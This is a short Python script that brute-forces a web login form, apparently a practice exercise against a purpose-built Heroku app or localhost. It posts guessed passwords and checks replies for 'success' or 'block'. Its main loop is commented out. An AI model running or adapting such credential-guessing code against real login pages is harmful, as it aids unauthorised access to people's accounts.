#!/usr/bin/env python3
import requests
import time
import sys

try:
    if sys.argv[1]:
        url = 'http://localhost:8080/'  # test on localhost
except Exception:
    url = 'http://brutefo.herokuapp.com/'


headers = {'User-Agent': 'Mozilla'}
data = {
    'email': 'test@gmail.com',
    'password': '.5_pFO*p6s8Kcj+U'
}
sess = requests.Session()
sess.headers['User-Agent'] = 'Mozilla'
password = ''  # use this for attempting and brute-force


def try_password(trial=''):
    ' Send POST request with password '
    # global url  # declaring as global variables
    # global headers
    # global data
    if not trial:
        return 'No password entered'
    try:
        data['password'] = ''.join(trial)
        print(data['password'])
        res = sess.post(url, data=data)
        if 'success' in res.text:  # if brute-force successful
            return 'success'
        elif 'block' in res.text:  # IP is blocked by server
            return 'block'
    except Exception:
        pass  # if fail to post, retry
    return ''  # empty string if failed


password = '.5_pFO*p6s8Kcj+U'
password = list(password)


def main():
    ' Perform Brute force attack '
    for attempt in range(10):
        res = try_password(password)
        if res:
            print(res)
        last_char = password[-1]
        last_char = chr(ord(last_char) + 1)  # increase last character
        password[-1] = last_char


try_password(password)

if __name__ == '__main__':
    1 #main()
